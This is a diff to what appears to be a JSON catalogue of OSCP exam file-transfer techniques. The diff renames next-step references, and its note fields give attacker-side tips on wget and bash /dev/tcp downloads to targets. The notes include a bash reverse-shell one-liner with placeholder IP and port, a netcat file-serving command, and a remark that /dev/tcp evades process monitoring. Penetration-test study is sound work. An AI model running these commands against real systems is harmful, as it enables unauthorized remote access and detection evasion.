@@ -79,8 +79,7 @@
         "ft-bash-dev-tcp"
       ],
       "next_steps": [
-        "ft-chmod-execute",
-        "ft-wget-upload"
+        "chmod-executable"
       ],
       "notes": "OSCP METHODOLOGY: First choice for Linux downloads - installed on 99% of systems. Shows progress bar (helpful for large files), auto-retries on failure, supports resume.\n\nMANUAL ALTERNATIVE: Could use browser if GUI access available, or manual HTTP GET via netcat, but wget is almost always available.\n\nEXAM TIP: After download, check file integrity: md5sum <FILE> and compare with source. Make scripts executable: chmod +x <FILE>. If wget unavailable, immediately try curl.\n\nCOMMON DESTINATIONS: /tmp/ (world writable but cleared on reboot), /dev/shm/ (RAM disk, fast), /var/tmp/ (persistent), current directory if writable.\n\nWGET VS CURL: wget is simpler for basic downloads, shows progress, handles recursive downloads better. curl has more features but complex syntax.\n\nTIME ESTIMATE: Near-instant for scripts under 1MB, shows real-time progress for larger files.",
       "oscp_relevance": "high"
@@ -230,7 +229,7 @@
         "ft-curl-download"
       ],
       "next_steps": [
-        "ft-bash-reverse-shell"
+        "bash-reverse-shell"
       ],
       "notes": "OSCP METHODOLOGY: Last resort for downloads when wget, curl, nc all unavailable or blocked. Uses bash built-in TCP capabilities - no external commands executed, harder to detect in process monitoring.\n\nMANUAL ALTERNATIVE: Could use telnet or other network tools, but /dev/tcp is pure bash.\n\nWHEN TO USE: Extremely restricted environments where all download tools removed/blocked. Relies only on bash and cat (core utilities).\n\nEXAM TIP: On attack machine, use netcat to serve file: nc -lvnp <PORT> < file. On target, immediately run this command. Connection is one-shot - closes after transfer. Check file integrity with md5sum.\n\nLIMITATIONS: No error handling, no resume capability, requires bash (not sh/dash). Some bash builds lack /dev/tcp support (compile-time option).\n\nREVERSE SHELLS: Same technique for shells: bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\n\nTIME ESTIMATE: Instant for small files, but no progress indication. File appears when complete.",
       "oscp_relevance": "medium"
